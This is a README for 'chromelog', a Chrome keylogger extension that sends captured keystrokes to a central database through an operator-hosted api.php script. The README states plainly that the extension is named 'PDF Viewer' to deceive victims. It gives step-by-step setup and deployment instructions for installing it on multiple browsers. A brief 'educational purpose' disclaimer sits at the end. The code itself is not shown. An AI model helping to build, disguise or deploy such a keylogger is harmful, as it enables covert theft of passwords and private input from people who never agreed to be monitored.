# chromelog
A keylogger extension for Chrome browser with centralized database connection. Deploy on multiple Goolge Chrome clients and log data in a single database.
The name of the extension is "PDF Viewer" which is just to deceive victims while deploying this extension.

## How to install
Step 1: Create a database and add the table script inside the "db" folder.
Step 2: Edit the database credentials in "api/api.php" file.
Step 3: upload api.php file to your server.
Step 4: Open the "extension/src/inject/payload.js" file and add the url of your api.php file on line 105 and 123.
Step 5: Open Google Chrome extensions, enable developer mode and load the "extension" folder to deploy the extension.

## Disclaimer
This is just for educational purpose, use of this script for any illegal purpose is crime and the author of this code is not responsible for any damages caused by illegal use.
